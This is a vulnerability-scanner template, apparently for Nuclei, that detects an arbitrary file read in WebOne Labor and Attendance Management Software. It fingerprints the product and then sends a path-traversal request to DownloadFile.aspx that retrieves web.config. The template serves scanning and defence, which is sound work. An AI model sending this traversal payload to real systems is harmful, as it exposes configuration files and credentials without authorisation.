id: poc-yaml-webone-lams-downloadfile-aspx-anyfile-read
info:
  name: WebOne Labor and Attendance Management Software DownloadFile.aspx Arbitrary File Read Vulnerability
  author: ProjectDiscoveryAI
  severity: high
  tags: file-read
  description: |
    This template detects an arbitrary file read vulnerability in the WebOne Labor and Attendance Management Software's DownloadFile.aspx endpoint.

http:
  - method: GET
    path:
      - "{{BaseURL}}/"
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "Webone-WTS劳动力管理套件"

  - method: GET
    path:
      - "{{BaseURL}}/webForms/Download/DownloadFile.aspx?fileid=/../../web.config&flag=report"
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "</system.web>"
          - "<configuration>"
      - type: word
        part: header
        words:
          - "filename="
      - type: word
        part: header
        words:
          - "application/octet-stream"
